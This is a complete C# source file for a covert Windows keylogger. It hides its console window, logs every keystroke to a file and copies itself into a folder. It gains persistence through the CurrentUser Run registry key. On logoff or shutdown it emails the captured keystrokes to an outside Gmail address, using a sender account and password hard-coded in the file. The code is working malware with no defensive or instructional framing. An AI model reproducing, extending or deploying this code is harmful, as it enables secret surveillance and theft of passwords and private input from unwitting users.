using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;
using Microsoft.Win32;


namespace KeyLogger
{
    class Program
    {
        public static bool chcSysEve = false;
        public static string path = @"C:\Keylogger\"; //Example directory
        public static string pathTxt = @"C:\Keylogger\Handler.dat"; //Handler.dat stores keystrokes

        public static string appName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        public static string appExe = Path.GetFileName(appName);
        static string regdit = path + appExe;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;


        static void Main(string[] args)
        {
            Program p = new Program();
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

        ExLoop:
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
                File.Create(pathTxt);
            }
            else if (Directory.Exists(path) && !File.Exists(pathTxt))
            {
                File.Create(pathTxt);
            }

            if (!File.Exists(pathTxt))
            {
                goto ExLoop;
            }
            else
            {
                p.Spread();
                using (StreamWriter writer = new StreamWriter(pathTxt))
                {
                    while (chcSysEve == false)
                    {
                        Thread.Sleep(10);
                        for (int i = 0; i < 255; i++)
                        {
                            int keyState = GetAsyncKeyState(i);
                            if (keyState == 1 || keyState == -32767)
                            {
                                SystemEvents.SessionEnding += SystemEvents_SessionEnding; //If program detects user logging off or 
                                //shutting down system it sends mail
                                Console.WriteLine((Keys)i);
                                writer.WriteLine((Keys)i);
                                writer.Flush();
                                break;
                            }
                        }
                    }
                }

            }
        }
        private void Spread()
        {
            if (!File.Exists(path + appExe))
            {
                FileInfo fi = new FileInfo(appName);
                fi.CopyTo(path + appExe);

                RegistryKey rk = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue(appExe, path + appExe);
            }
        }
        static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            chcSysEve = true;
            Program p = new Program();
            switch (e.Reason)
            {
                case SessionEndReasons.Logoff:
                    p.SendMail();
                    break;
                case SessionEndReasons.SystemShutdown:
                    p.SendMail();
                    break;
            }
        }
        private void SendMail()
        {
            Program p = new Program();
            string date = DateTime.Now.ToString(@"dd\/MM h\:mm tt");
            string user = Environment.UserName;
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("uu746825@gmail.com");
                mail.To.Add("adam.haldas@gmail.com");
                mail.Subject = "Saved keys from " + date;
                mail.Body = "Keystrokes saved from user " + user;

                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment(pathTxt);
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("uu746825@gmail.com", "6MqC7nBsHVn2L26y");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                MessageBox.Show(ex.ToString());
            }
        }
    }
}
